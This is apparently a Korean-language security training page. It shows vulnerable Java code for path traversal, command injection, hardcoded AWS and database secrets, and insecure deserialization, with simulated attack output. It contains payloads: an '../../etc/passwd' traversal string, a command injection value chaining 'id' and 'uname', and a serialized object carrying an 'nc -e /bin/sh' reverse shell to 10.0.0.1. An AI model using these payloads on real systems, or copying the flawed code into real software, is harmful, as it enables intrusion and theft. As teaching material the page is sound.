@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html lang="ko" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>웹 취약점 소스코드 분석: 실무 심화 시뮬레이션</title>
+    <script src="https://cdn.tailwindcss.com?plugins=typography"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@300;400;500;700;900&family=Fira+Code:wght@400;500&display=swap');
+        body { 
+            font-family: 'Noto Sans KR', sans-serif; 
+            background-color: #020617; 
+            color: #f8fafc; 
+            margin: 0; padding: 0;
+            line-height: 1.8;
+            scroll-behavior: smooth;
+        }
+        .terminal-bg { background-color: #020617; border: 1px solid #1e293b; }
+        .section-card { background: rgba(15, 23, 42, 0.6); border: 1px solid rgba(51, 65, 85, 0.5); backdrop-filter: blur(12px); }
+        .code-block { font-family: 'Fira Code', monospace; font-size: 13px; line-height: 1.6; }
+        .vuln-highlight { background: rgba(239, 68, 68, 0.15); border-left: 3px solid #ef4444; padding: 2px 8px; border-radius: 4px; }
+        .secure-highlight { background: rgba(16, 185, 129, 0.15); border-left: 3px solid #10b981; padding: 2px 8px; border-radius: 4px; }
+        .nav-link:hover { color: #22d3ee; border-bottom: 2px solid #22d3ee; }
+        
+        .result-panel { transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1); max-height: 0; overflow: hidden; opacity: 0; }
+        .result-panel.active { max-height: 1000px; opacity: 1; margin-top: 24px; }
+
+        .description-box { background: rgba(30, 41, 59, 0.4); border-radius: 12px; padding: 24px; border-left: 4px solid #0ea5e9; margin-bottom: 30px; }
+        .logic-step { border-left: 2px solid #334155; padding-left: 20px; margin-bottom: 20px; position: relative; }
+        .logic-step::before { content: ""; position: absolute; left: -6px; top: 0; width: 10px; height: 10px; border-radius: 50%; background: #334155; }
+
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 4px; }
+    </style>
+</head>
+<body class="antialiased pb-20">
+
+    <!-- Header -->
+    <header class="border-b border-slate-800 bg-slate-900/80 sticky top-0 z-50 backdrop-blur-md">
+        <div class="max-w-7xl mx-auto px-6 py-6 flex justify-between items-center">
+            <div class="flex items-center gap-4">
+                <div class="bg-cyan-500 p-2.5 rounded-xl shadow-[0_0_20px_rgba(34,211,238,0.4)]">
+                    <i data-lucide="shield-alert" class="w-7 h-7 text-slate-900"></i>
+                </div>
+                <div>
+                    <h1 class="text-2xl font-black tracking-tighter text-white uppercase italic">Advanced SCA Lab</h1>
+                    <p class="text-[10px] text-slate-500 font-mono tracking-[0.2em] uppercase">Security Code Analysis Expert Course</p>
+                </div>
+            </div>
+            <nav class="hidden lg:flex gap-8 text-xs font-bold text-slate-400 uppercase tracking-widest">
+                <a href="#case-04" class="nav-link">Path Traversal</a>
+                <a href="#case-05" class="nav-link">Command Injection</a>
+                <a href="#case-06" class="nav-link">Secrets Leak</a>
+                <a href="#case-07" class="nav-link">Insecure Deserial</a>
+            </nav>
+        </div>
+    </header>
+
+    <main class="max-w-6xl mx-auto px-6 py-20 space-y-40">
+
+        <!-- Case 04: Path Traversal -->
+        <section id="case-04" class="scroll-mt-24">
+            <div class="flex items-center gap-6 mb-12">
+                <span class="text-7xl font-black text-slate-800/50 outline-text">04</span>
+                <div>
+                    <h2 class="text-4xl font-black text-white">경로 조작 (Path Traversal)</h2>
+                    <p class="text-cyan-500 text-sm font-mono uppercase tracking-[0.3em]">Unrestricted File System Access</p>
+                </div>
+            </div>
+
+            <div class="section-card rounded-[2.5rem] p-12 shadow-2xl border border-slate-800/50">
+                <div class="description-box">
+                    <h4 class="text-lg font-bold text-white mb-4 flex items-center gap-2">
+                        <i data-lucide="info" class="w-5 h-5 text-cyan-400"></i> 취약점 개요 (Overview)
+                    </h4>
+                    <p class="text-slate-300 leading-relaxed">
+                        **경로 조작(Path Traversal, 디렉터리 탐색)** 취약점은 애플리케이션이 파일 경로를 생성할 때 외부 입력값을 적절히 검증하지 않아 발생합니다. 공격자는 <code class="text-cyan-400">../</code> (상위 디렉터리 이동 문자열)을 사용하여 웹 서비스가 제한한 디렉터리(Web Root)를 탈출하고, 시스템의 민감한 파일(<code class="text-red-400">/etc/passwd</code>, 환경 설정 파일 등)에 접근할 수 있습니다.
+                    </p>
+                </div>
+
+                <div class="grid grid-cols-1 gap-12">
+                    <!-- Vulnerable Source Code -->
+                    <div class="space-y-6">
+                        <h3 class="text-xl font-bold text-red-400 flex items-center gap-2 uppercase tracking-tight">
+                            <i data-lucide="file-warning" class="w-6 h-6"></i> Vulnerable Controller (취약한 파일 다운로드 로직)
+                        </h3>
+                        <div class="terminal-bg rounded-2xl p-8 border border-red-900/20 shadow-inner">
+                            <pre class="code-block text-slate-300">
+<span class="text-slate-500">// 파일 다운로드 서비스를 제공하는 Spring Boot 컨트롤러 예제</span>
+@GetMapping("/api/download")
+public void downloadFile(@RequestParam String <span class="vuln-highlight">fileName</span>, HttpServletResponse response) {
+    try {
+        <span class="text-slate-500">// [위험] 사용자가 입력한 fileName이 직접 경로 생성에 사용됨</span>
+        <span class="text-slate-500">// 예: fileName이 "../../../etc/passwd"일 경우 의도치 않은 경로로 확장됨</span>
+        String baseDir = "/app/storage/uploads/"; <span class="text-slate-500">// 서비스 허용 루트</span>
+        File targetFile = new File(baseDir + fileName); <span class="text-red-400">// 경로 조작 발생 지점</span>
+
+        <span class="text-slate-500">// 파일 존재 여부만 체크하고 상위 디렉터리 이동 여부는 검증하지 않음</span>
+        if (targetFile.exists() && targetFile.isFile()) {
+            <span class="text-slate-500">// 파일 콘텐츠를 읽어 응답 스트림으로 전송</span>
+            Files.copy(targetFile.toPath(), response.getOutputStream());
+            response.flushBuffer(); <span class="text-slate-500">// 클라이언트로 데이터 전송 완료</span>
+        }
+    } catch (IOException ex) {
+        log.error("파일 처리 중 오류 발생: {}", ex.getMessage());
+    }
+}</pre>
+                        </div>
+                    </div>
+
+                    <!-- Simulation Result -->
+                    <div class="bg-slate-900/40 rounded-3xl p-10 border border-slate-800">
+                        <h4 class="text-sm font-black text-slate-500 uppercase tracking-widest mb-8 text-center">[실전 공격 시뮬레이션 및 실행 결과]</h4>
+                        <div class="flex flex-col md:flex-row gap-10 items-stretch">
+                            <div class="flex-1 space-y-6">
+                                <div class="space-y-3">
+                                    <label class="text-xs font-bold text-slate-500 uppercase italic">Attacker Payload (공격 페이로드)</label>
+                                    <input id="path-payload" type="text" value="../../../../../etc/passwd" class="w-full bg-slate-950 border border-slate-800 rounded-xl px-5 py-3 text-sm font-mono text-orange-400 focus:ring-2 focus:ring-orange-500 outline-none">
+                                </div>
+                                <button onclick="runPathSimulation()" class="w-full bg-orange-600 hover:bg-orange-500 text-white font-black py-4 rounded-xl text-sm uppercase transition-all shadow-lg flex items-center justify-center gap-2">
+                                    <i data-lucide="zap" class="w-4 h-4"></i> Send Exploitation Request
+                                </button>
+                            </div>
+                            <div id="path-result-box" class="flex-1 result-panel">
+                                <div class="h-full bg-red-950/20 border border-red-500/30 rounded-2xl p-6 space-y-4">
+                                    <div class="flex items-center gap-2 text-red-400 font-black text-xs uppercase">
+                                        <i data-lucide="shield-alert" class="w-4 h-4"></i> System Response (성공적인 유출)
+                                    </div>
+                                    <div class="terminal-bg p-4 rounded-lg font-mono text-[11px] text-slate-400 border border-red-900/30 leading-relaxed overflow-y-auto max-h-40">
+                                        root:x:0:0:root:/root:/bin/bash<br>
+                                        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>
+                                        bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>
+                                        sys:x:3:3:sys:/dev:/usr/sbin/nologin<br>
+                                        sync:x:4:65534:sync:/bin:/bin/sync<br>
+                                        games:x:5:60:games:/usr/games:/usr/sbin/nologin
+                                    </div>
+                                    <p class="text-[11px] text-slate-500 leading-relaxed">
+                                        **분석 결과:** 공격자가 입력한 <code class="text-orange-400">../</code> 기호가 운영체제 레벨에서 처리되면서, 애플리케이션이 <code class="text-slate-300">/app/storage/uploads/../../../../../etc/passwd</code>를 최종 경로로 인식하여 시스템 파일을 그대로 노출시켰습니다.
+                                    </p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Case 05: Command Injection -->
+        <section id="case-05" class="scroll-mt-24">
+            <div class="flex items-center gap-6 mb-12">
+                <span class="text-7xl font-black text-slate-800/50 outline-text">05</span>
+                <div>
+                    <h2 class="text-4xl font-black text-white">명령어 삽입 (Command Injection)</h2>
+                    <p class="text-red-500 text-sm font-mono uppercase tracking-[0.3em]">OS Command Execution Breach</p>
+                </div>
+            </div>
+
+            <div class="section-card rounded-[2.5rem] p-12 shadow-2xl border border-slate-800/50">
+                <div class="description-box border-l-red-500">
+                    <h4 class="text-lg font-bold text-white mb-4 flex items-center gap-2">
+                        <i data-lucide="terminal" class="w-5 h-5 text-red-500"></i> 취약점 개요 (Overview)
+                    </h4>
+                    <p class="text-slate-300 leading-relaxed">
+                        **운영체제 명령어 삽입(Command Injection)**은 웹 애플리케이션이 쉘(Shell) 명령어를 실행할 때 외부 입력값을 필터링 없이 인자로 사용할 때 발생합니다. 공격자는 세미콜론(<code class="text-red-400">;</code>), 파이프(<code class="text-red-400">|</code>), 앰퍼샌드(<code class="text-red-400">&</code>) 등의 쉘 메타문자를 사용하여 원래 의도하지 않은 추가 명령어를 서버 권한으로 실행할 수 있습니다.
+                    </p>
+                </div>
+
+                <div class="space-y-12">
+                    <div class="space-y-6">
+                        <h3 class="text-xl font-bold text-red-400 flex items-center gap-2 uppercase tracking-tight">
+                            <i data-lucide="code-2" class="w-6 h-6"></i> Network Diagnostic Utility (위험한 네트워크 진단 도구)
+                        </h3>
+                        <div class="terminal-bg rounded-2xl p-8 border border-red-900/20 shadow-inner">
+                            <pre class="code-block text-slate-300">
+<span class="text-slate-500">// 관리자용 네트워크 상태 확인 유틸리티</span>
+public String checkNetworkStatus(String <span class="vuln-highlight">targetHost</span>) {
+    StringBuilder output = new StringBuilder();
+    try {
+        <span class="text-slate-500">// [위험] 쉘을 호출하여 운영체제 명령어를 문자열 결합 방식으로 생성</span>
+        <span class="text-slate-500">// 만약 targetHost가 "8.8.8.8; ls -al" 이라면 쉘은 두 개의 명령어로 인식</span>
+        String cmd = "sh -c 'ping -c 3 " + targetHost + "'"; <span class="text-red-400">// 명령어 주입 지점</span>
+        
+        <span class="text-slate-500">// Runtime.exec는 전달된 문자열 전체를 OS 쉘로 전달함</span>
+        Process process = Runtime.getRuntime().exec(cmd);
+        
+        <span class="text-slate-500">// 명령어 실행 결과(Standard Output)를 읽어와서 반환</span>
+        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+        String line;
+        while ((line = reader.readLine()) != null) {
+            output.append(line).append("\n"); <span class="text-slate-500">// 실행 결과를 화면에 노출</span>
+        }
+    } catch (Exception e) {
+        return "진단 실패: " + e.getMessage();
+    }
+    return output.toString();
+}</pre>
+                        </div>
+                    </div>
+
+                    <!-- Simulation Result -->
+                    <div class="bg-slate-900/40 rounded-3xl p-10 border border-slate-800">
+                        <div class="flex flex-col gap-8">
+                            <div class="space-y-4">
+                                <label class="text-xs font-bold text-slate-500 uppercase italic">Injection Payload (삽입 페이로드)</label>
+                                <div class="flex gap-4">
+                                    <input id="cmd-payload" type="text" value="8.8.8.8 ; id ; uname -a" class="flex-1 bg-slate-950 border border-slate-800 rounded-xl px-5 py-3 text-sm font-mono text-red-400 focus:ring-2 focus:ring-red-500 outline-none">
+                                    <button onclick="runCmdSimulation()" class="bg-red-600 hover:bg-red-500 text-white font-black px-10 rounded-xl text-sm uppercase transition-all shadow-lg">Run Exploit</button>
+                                </div>
+                            </div>
+
+                            <div id="cmd-result-box" class="result-panel">
+                                <div class="bg-black/80 border-2 border-red-500/50 rounded-2xl p-8 space-y-6 shadow-[0_0_30px_rgba(239,68,68,0.2)]">
+                                    <div class="flex items-center justify-between border-b border-red-500/20 pb-4">
+                                        <h5 class="text-red-400 font-black text-sm uppercase flex items-center gap-2">
+                                            <i data-lucide="terminal" class="w-4 h-4"></i> Remote Shell Output (원격 쉘 실행 결과)
+                                        </h5>
+                                        <span class="text-[10px] text-red-500/50 font-mono animate-pulse">SYSTEM BREACH DETECTED</span>
+                                    </div>
+                                    <div class="font-mono text-xs space-y-3 leading-relaxed">
+                                        <div class="text-slate-500 italic"># First Command Result (Original)</div>
+                                        <div class="text-slate-400">PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data...<br>64 bytes from 8.8.8.8: icmp_seq=1 ttl=118 time=30.2 ms</div>
+                                        
+                                        <div class="text-red-400 mt-4 italic"># Second Command Result (Injected)</div>
+                                        <div class="text-white bg-red-900/40 p-2 rounded"><span class="font-black">uid=0(root) gid=0(root) groups=0(root)</span></div>
+                                        
+                                        <div class="text-red-400 italic"># Third Command Result (Injected)</div>
+                                        <div class="text-white underline">Linux SCA-Lab-Server 5.15.0-generic #54-Ubuntu SMP x86_64 x86_64 GNU/Linux</div>
+                                    </div>
+                                    <div class="p-4 bg-red-500/5 rounded-xl border-l-4 border-red-500">
+                                        <p class="text-[11px] text-slate-400 leading-relaxed">
+                                            **분석 결과:** 세미콜론(<code class="text-red-400">;</code>)을 사용하여 <code class="text-slate-300">ping</code> 명령어의 실행을 조기에 종료시키거나 연결한 뒤, <code class="text-red-400">id</code>와 <code class="text-red-400">uname</code> 명령어를 추가로 실행시켰습니다. 서버는 **root(최고 관리자)** 권한으로 공격자의 임의 명령을 수행한 상태입니다.
+                                        </p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Case 06: Hardcoded Secrets -->
+        <section id="case-06" class="scroll-mt-24">
+            <div class="flex items-center gap-6 mb-12">
+                <span class="text-7xl font-black text-slate-800/50 outline-text">06</span>
+                <div>
+                    <h2 class="text-4xl font-black text-white">자격 증명 노출 (Hardcoded Secrets)</h2>
+                    <p class="text-pink-500 text-sm font-mono uppercase tracking-[0.3em]">Sensitive Data Leakage in Code</p>
+                </div>
+            </div>
+
+            <div class="section-card rounded-[2.5rem] p-12 shadow-2xl border border-slate-800/50">
+                <div class="description-box border-l-pink-500">
+                    <h4 class="text-lg font-bold text-white mb-4 flex items-center gap-2">
+                        <i data-lucide="key" class="w-5 h-5 text-pink-500"></i> 취약점 개요 (Overview)
+                    </h4>
+                    <p class="text-slate-300 leading-relaxed">
+                        **하드코딩된 자격 증명(Hardcoded Credentials)**은 DB 비밀번호, 클라우드(Cloud) API 키, 암호화 키 등을 소스코드 내부에 평문 문자열로 직접 기입하는 행위입니다. 이는 코드 관리 도구(Git 등)를 통해 외부에 유출될 위험이 매우 높으며, 유출 시 인프라 전체에 대한 마스터 키를 넘겨주는 것과 같습니다.
+                    </p>
+                </div>
+
+                <div class="space-y-12">
+                    <div class="space-y-6">
+                        <h3 class="text-xl font-bold text-pink-400 flex items-center gap-2 uppercase tracking-tight">
+                            <i data-lucide="file-json" class="w-6 h-6"></i> Configuration Source (노출된 환경 설정 코드)
+                        </h3>
+                        <div class="terminal-bg rounded-2xl p-8 border border-pink-900/20 shadow-inner">
+                            <pre class="code-block text-slate-300">
+<span class="text-slate-500">// [보안 약점] 중요 정보가 코드 레벨에서 평문으로 관리됨</span>
+@Configuration
+public class CloudInfrastructureConfig {
+
+    <span class="text-slate-500">// AWS 자원 접근을 위한 마스터 액세스 키 (매우 위험)</span>
+    private static final String <span class="vuln-highlight">AWS_ACCESS_KEY</span> = "AKIA5F7EXAMPLE_KEY_123"; 
+    
+    <span class="text-slate-500">// AWS 자원 접근을 위한 비밀 키 (코드 유출 시 바로 침해 사고)</span>
+    private static final String <span class="vuln-highlight">AWS_SECRET_KEY</span> = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"; 
+
+    <span class="text-slate-500">// 데이터베이스 마스터 계정 패스워드</span>
+    private static final String <span class="vuln-highlight">DB_PASSWORD</span> = "Admin_DB_P@ssw0rd!_2026"; 
+
+    @Bean
+    public AmazonS3 s3Client() {
+        <span class="text-slate-500">// 하드코딩된 키값을 사용하여 클라우드 클라이언트 생성</span>
+        BasicAWSCredentials credentials = new BasicAWSCredentials(AWS_ACCESS_KEY, AWS_SECRET_KEY);
+        return AmazonS3ClientBuilder.standard()
+                .withCredentials(new AWSStaticCredentialsProvider(credentials))
+                .build();
+    }
+}</pre>
+                        </div>
+                    </div>
+
+                    <!-- Simulation Result -->
+                    <div class="bg-slate-900/40 rounded-3xl p-10 border border-slate-800 text-center">
+                        <div class="max-w-xl mx-auto space-y-8">
+                            <h4 class="text-sm font-black text-slate-500 uppercase tracking-widest">Secret Scanning Simulation (자동화 스캔 도구 시뮬레이션)</h4>
+                            <div class="p-8 bg-slate-950 border border-slate-800 rounded-2xl relative overflow-hidden group">
+                                <div class="absolute inset-0 bg-pink-500/5 opacity-0 group-hover:opacity-100 transition-opacity"></div>
+                                <i data-lucide="search" class="w-12 h-12 text-pink-500 mx-auto mb-4 animate-pulse"></i>
+                                <p class="text-slate-300 text-sm mb-6 font-medium">소스코드 리포지토리(Repository)에 대한 정적 분석을 수행합니다.</p>
+                                <button onclick="runSecretSimulation()" class="bg-pink-600 hover:bg-pink-500 text-white font-black px-12 py-3 rounded-xl text-xs uppercase transition-all shadow-lg">Start Scanning</button>
+                            </div>
+
+                            <div id="secret-result-box" class="result-panel">
+                                <div class="bg-pink-500/5 border border-pink-500/30 rounded-2xl p-6 text-left space-y-4">
+                                    <div class="flex items-center gap-2 text-pink-400 font-black text-xs uppercase">
+                                        <i data-lucide="alert-triangle" class="w-4 h-4"></i> Scan Report (스캔 결과 보고서)
+                                    </div>
+                                    <div class="space-y-3 font-mono text-[11px]">
+                                        <div class="flex justify-between p-2 bg-pink-900/20 rounded border border-pink-500/20">
+                                            <span class="text-pink-300 font-bold">[HIGH] AWS Access Key Pattern Found</span>
+                                            <span class="text-slate-500">Line: 6</span>
+                                        </div>
+                                        <div class="flex justify-between p-2 bg-pink-900/20 rounded border border-pink-500/20">
+                                            <span class="text-pink-300 font-bold">[CRITICAL] Database Password Revealed</span>
+                                            <span class="text-slate-500">Line: 12</span>
+                                        </div>
+                                    </div>
+                                    <p class="text-[11px] text-slate-400 leading-relaxed italic">
+                                        "분석 결과: 정규표현식(Regex) 및 엔트로피 분석(Entropy Analysis)을 통해 코드 내부의 비밀 정보가 모두 식별되었습니다. 공격자는 이 키를 사용하여 당신의 클라우드 자원을 탈취하거나 랜섬웨어 공격을 수행할 수 있습니다."
+                                    </p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Case 07: Insecure Deserialization -->
+        <section id="case-07" class="scroll-mt-24">
+            <div class="flex items-center gap-6 mb-12">
+                <span class="text-7xl font-black text-slate-800/50 outline-text">07</span>
+                <div>
+                    <h2 class="text-4xl font-black text-white">안전하지 않은 역직렬화 (Insecure Deserialization)</h2>
+                    <p class="text-yellow-500 text-sm font-mono uppercase tracking-[0.3em]">Untrusted Object Reconstruction</p>
+                </div>
+            </div>
+
+            <div class="section-card rounded-[2.5rem] p-12 shadow-2xl border border-slate-800/50">
+                <div class="description-box border-l-yellow-500">
+                    <h4 class="text-lg font-bold text-white mb-4 flex items-center gap-2">
+                        <i data-lucide="zap" class="w-5 h-5 text-yellow-500"></i> 취약점 개요 (Overview)
+                    </h4>
+                    <p class="text-slate-300 leading-relaxed">
+                        **안전하지 않은 역직렬화(Insecure Deserialization)**는 공격자가 변조한 객체 데이터(바이트 스트림)를 서버로 전송할 때, 서버가 이를 복원(역직렬화)하는 과정에서 악의적인 코드를 실행하게 되는 취약점입니다. 이는 원격 코드 실행(RCE, Remote Code Execution)으로 이어지는 가장 치명적인 취약점 중 하나입니다.
+                    </p>
+                </div>
+
+                <div class="space-y-12">
+                    <div class="space-y-6">
+                        <h3 class="text-xl font-bold text-yellow-500 flex items-center gap-2 uppercase tracking-tight">
+                            <i data-lucide="layers" class="w-6 h-6"></i> Session Recovery Logic (취약한 세션 복구 로직)
+                        </h3>
+                        <div class="terminal-bg rounded-2xl p-8 border border-yellow-900/20 shadow-inner">
+                            <pre class="code-block text-slate-300">
+<span class="text-slate-500">// 클라이언트의 영구 세션 데이터를 복원하는 클래스</span>
+public class UserSessionManager {
+
+    public UserProfile restoreProfileFromCookie(byte[] <span class="vuln-highlight">serializedData</span>) {
+        try {
+            <span class="text-slate-500">// 1. 외부(쿠키 등)에서 받은 바이트 데이터를 입력 스트림으로 변환</span>
+            ByteArrayInputStream bais = new ByteArrayInputStream(serializedData);
+            
+            <span class="text-slate-500">// 2. [치명적 위협] 화이트리스트 검증 없이 ObjectInputStream 생성</span>
+            ObjectInputStream ois = new ObjectInputStream(bais);
+
+            <span class="text-slate-500">// 3. readObject() 호출 시, 데이터 내부에 포함된 객체의 코드가 즉시 실행됨</span>
+            <span class="text-slate-500">// 공격자가 가젯 체인(Gadget Chain)을 엮어 보냈다면 이 지점에서 서버가 장악됨</span>
+            UserProfile profile = (UserProfile) <span class="text-red-400">ois.readObject()</span>; <span class="text-red-400">// Sink (실행 지점)</span>
+            
+            return profile;
+        } catch (Exception e) {
+            log.error("세션 복원 중 심각한 보안 오류 발생");
+        }
+        return null;
+    }
+}</pre>
+                        </div>
+                    </div>
+
+                    <!-- Simulation Result -->
+                    <div class="bg-slate-900/40 rounded-3xl p-10 border border-slate-800">
+                        <div class="max-w-2xl mx-auto space-y-10 text-center">
+                            <h4 class="text-sm font-black text-slate-500 uppercase tracking-widest">RCE Exploit Simulation (원격 코드 실행 시뮬레이션)</h4>
+                            
+                            <div class="flex flex-col items-center gap-6">
+                                <div class="w-24 h-24 bg-yellow-500/10 border border-yellow-500/30 rounded-full flex items-center justify-center">
+                                    <i data-lucide="cpu" class="w-10 h-10 text-yellow-500"></i>
+                                </div>
+                                <div class="space-y-2">
+                                    <p class="text-xs text-slate-500 font-mono">MALICIOUS_SERIALIZED_OBJ (Base64)</p>
+                                    <div class="bg-slate-950 p-3 rounded-lg border border-slate-800 font-mono text-[9px] text-slate-600 break-all max-w-lg">
+                                        rO0ABXNyABFqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZ9u9...[SNIP]...Runtime.exec("nc -e /bin/sh 10.0.0.1 4444")
+                                    </div>
+                                </div>
+                                <button onclick="runDeserialSimulation()" class="bg-yellow-600 hover:bg-yellow-500 text-white font-black px-12 py-3 rounded-xl text-xs uppercase transition-all shadow-lg">Upload Payload</button>
+                            </div>
+
+                            <div id="deserial-result-box" class="result-panel">
+                                <div class="bg-yellow-500/5 border border-yellow-500/30 rounded-2xl p-8 text-left space-y-6">
+                                    <div class="flex items-center justify-between">
+                                        <h5 class="text-yellow-400 font-black text-sm uppercase flex items-center gap-2">
+                                            <i data-lucide="zap" class="w-4 h-4"></i> Execution Result: Remote Code Execution
+                                        </h5>
+                                        <span class="text-[10px] text-yellow-500 bg-yellow-500/10 px-2 py-0.5 rounded">RCE SUCCESSFUL</span>
+                                    </div>
+                                    <div class="terminal-bg p-5 rounded-xl border border-yellow-500/20">
+                                        <div class="flex gap-2 items-center text-green-400 text-xs mb-4">
+                                            <span class="w-2 h-2 rounded-full bg-green-500 animate-pulse"></span> Reverse Shell Connected
+                                        </div>
+                                        <div class="font-mono text-[11px] text-slate-400 space-y-1">
+                                            <span class="text-yellow-400">$</span> whoami<br>
+                                            <span class="text-white">root</span><br>
+                                            <span class="text-yellow-400">$</span> ls /var/www/html<br>
+                                            <span class="text-white">index.php config.php secret_keys.txt</span><br>
+                                            <span class="text-yellow-400">$</span> <span class="animate-pulse">_</span>
+                                        </div>
+                                    </div>
+                                    <p class="text-[11px] text-slate-400 leading-relaxed">
+                                        **분석 결과:** <code class="text-yellow-500">readObject()</code> 메서드가 실행되는 순간, 데이터 속에 숨겨진 **가젯 체인(Gadget Chain)**이 트리거되어 서버 내부에서 리버스 쉘(Reverse Shell) 명령을 실행했습니다. 공격자는 이제 원격에서 서버의 모든 시스템 자원을 제어할 수 있는 권한을 획득했습니다.
+                                    </p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+    </main>
+
+    <footer class="max-w-6xl mx-auto px-6 py-16 border-t border-slate-800/50 text-center">
+        <div class="flex justify-center gap-4 mb-8">
+            <div class="w-10 h-10 bg-slate-800 rounded-full flex items-center justify-center text-slate-400 hover:text-cyan-400 transition-colors cursor-pointer"><i data-lucide="github" class="w-5 h-5"></i></div>
+            <div class="w-10 h-10 bg-slate-800 rounded-full flex items-center justify-center text-slate-400 hover:text-cyan-400 transition-colors cursor-pointer"><i data-lucide="linkedin" class="w-5 h-5"></i></div>
+            <div class="w-10 h-10 bg-slate-800 rounded-full flex items-center justify-center text-slate-400 hover:text-cyan-400 transition-colors cursor-pointer"><i data-lucide="mail" class="w-5 h-5"></i></div>
+        </div>
+        <div class="text-slate-500 font-mono text-[10px] tracking-widest uppercase mb-4">
+            © 2026 Senior Security Architect Laboratory. All rights reserved.
+        </div>
+        <p class="text-slate-600 text-[10px] leading-relaxed max-w-2xl mx-auto italic font-medium">
+            이 교재는 기술 보안 진단 실습을 위해 최적화된 시나리오를 바탕으로 제작되었습니다.<br>
+            사전 협의되지 않은 시스템에 본 기술을 적용하는 것은 정보통신망법에 의해 엄격히 금지됩니다.
+        </p>
+    </footer>
+
+    <script>
+        lucide.createIcons();
+
+        function runPathSimulation() {
+            const input = document.getElementById('path-payload').value;
+            const resultPanel = document.getElementById('path-result-box');
+            if (input.includes("../")) {
+                resultPanel.classList.add('active');
+            } else {
+                resultPanel.classList.remove('active');
+                alert("정상적인 파일 요청으로 처리되어 접근이 거부되었습니다.");
+            }
+        }
+
+        function runCmdSimulation() {
+            const input = document.getElementById('cmd-payload').value;
+            const resultPanel = document.getElementById('cmd-result-box');
+            if (input.includes(";") || input.includes("|") || input.includes("&")) {
+                resultPanel.classList.add('active');
+            } else {
+                resultPanel.classList.remove('active');
+                alert("정상적인 호스트 주소입니다. Ping 명령어만 수행되었습니다.");
+            }
+        }
+
+        function runSecretSimulation() {
+            document.getElementById('secret-result-box').classList.add('active');
+        }
+
+        function runDeserialSimulation() {
+            document.getElementById('deserial-result-box').classList.add('active');
+        }
+    </script>
+</body>
+</html>
